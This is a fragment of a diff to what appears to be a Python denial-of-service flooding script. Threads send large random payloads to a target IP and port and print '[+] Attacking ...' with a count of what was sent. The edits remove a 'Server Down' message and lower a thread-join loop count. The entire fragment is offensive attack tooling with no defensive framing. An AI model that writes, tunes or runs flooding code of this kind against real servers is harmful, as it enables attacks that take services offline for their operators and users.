@@ -317,7 +317,6 @@ def start2():
             print("[+] Attacking {0}:{1} | Sent: {2}".format(str(ip), int(port), xx))
         except:
             s.close()
-            print('[+] Server Down.')
 def start():
     global useragents, ref, acceptall, lolagent
     hh = random._urandom(75006)
@@ -347,5 +346,5 @@ for x in range(thread):
     thred2 = threading.Thread(target=start2)
     thred2.start()
     thred.start()
-for ty in range(15000):
+for ty in range(150):
   thred2.join()
